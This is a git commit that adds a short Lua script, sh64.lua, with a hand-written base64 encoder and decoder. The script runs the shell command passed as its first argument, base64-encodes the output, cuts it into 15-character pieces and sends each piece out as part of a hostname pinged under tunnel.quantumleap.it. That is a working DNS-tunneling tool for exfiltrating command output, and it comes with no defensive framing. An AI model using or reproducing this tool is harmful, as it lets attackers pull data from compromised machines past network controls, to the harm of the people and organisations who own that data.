28d900d0c842eeae96fe992a5adf0ff1d24ee6f8
root <root@localhost.localdomain>
2019-09-20 10:06:16 +0200

    first commit

---
+++ sh64.lua
@@ -0,0 +1,62 @@
+#!/usr/bin/lua
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' -- You will need this for encoding/decoding
+
+-- encoding
+function enc(data)
+    return ((data:gsub('.', function(x) 
+        local r,b='',x:byte()
+        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if (#x < 6) then return '' end
+        local c=0
+        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
+        return b:sub(c+1,c+1)
+    end)..({ '', '==', '=' })[#data%3+1])
+end
+
+-- decoding
+function dec(data)
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+            return string.char(c)
+    end))
+end
+
+local handle = io.popen(arg[1])
+local result = handle:read("*a")
+handle:close()
+
+payload = enc(result)
+print(payload)
+
+local l = string.len(payload)
+local i = 0
+local sz = 15
+local i_cnk = 0
+
+while i<l do 
+
+    local chunk = tostring(i_cnk) .. "-" .. string.sub(payload,i+1,i+sz)
+    i_cnk = i_cnk +1
+    i = i+sz
+    dest = "ping -c 1 " .. chunk .. ".tunnel.quantumleap.it"
+    print(dest)
+    local handle = io.popen(dest)
+    local result = handle:read("*a")
+    handle:close()
+
+end
+
+
+
+
+
